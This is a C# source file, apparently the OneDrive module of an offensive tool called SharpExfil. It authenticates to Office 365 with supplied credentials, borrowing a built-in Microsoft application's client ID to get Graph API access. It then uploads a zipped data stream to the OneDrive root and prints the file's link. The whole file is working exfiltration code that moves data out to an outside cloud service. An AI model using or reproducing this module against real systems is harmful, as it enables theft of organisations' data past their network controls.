using KoenZomers.OneDrive.Api;
using KoenZomers.OneDrive.Api.Entities;
using SharpExfil.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static SharpExfil.Program;

namespace SharpExfil.Modules
{
    public class OneDrive
    {
        public OneDrive(OneDriveOptions oneDriveOptions)
        {
            this.oneDriveOptions = oneDriveOptions;
        }

        public OneDriveOptions oneDriveOptions { get; set; }


        public async Task<int> UploadFile(Stream ZipStream, string newFileName)
        {

            Console.WriteLine("[+] Launching OneDrive module by @Flangvik");

            //GUID id for a known Microsoft Application that can access the Graph API by default.
            var oneDrive = new OneDriveGraphApi("1fec8e78-bce4-4aaf-ab1b-5451cc387264");

            Console.WriteLine("[+] Performing Authentication using provided credentials");

            //Perform OAuth to get access token from Credentials 
            var loginResponse = await Helpers.O365Helper.GetAccessToken(oneDriveOptions.Username, oneDriveOptions.Password);

            //Hacky check to see if we got an access token or not
            if (loginResponse.StartsWith("Bad reponse from o365"))
            {
                Console.WriteLine($"[!] Office OAuth Login returned: {loginResponse}");
                return 0;

            }

            Console.WriteLine("[+] Confirming access to https://graph.windows.net");

            //Auth using the refresh token 
            await oneDrive.AuthenticateUsingRefreshToken(loginResponse);


            EventHandler<OneDriveUploadProgressChangedEventArgs> progressHandler = delegate (object s, OneDriveUploadProgressChangedEventArgs a) { Console.WriteLine($"[+] Uploading {newFileName} {Helpers.Compression.BytesToString(ZipStream.Length)} - ({a.ProgressPercentage}%)"); };

            Console.WriteLine("[+] Starting upload");

            oneDrive.UploadProgressChanged += progressHandler;

            var data = await oneDrive.UploadFileAs(ZipStream, newFileName, await oneDrive.GetDriveRoot());

            oneDrive.UploadProgressChanged -= progressHandler;

            Console.WriteLine($"[+] Upload completed, file located: {data.WebUrl} ");

            return 0;
        }
    }
}
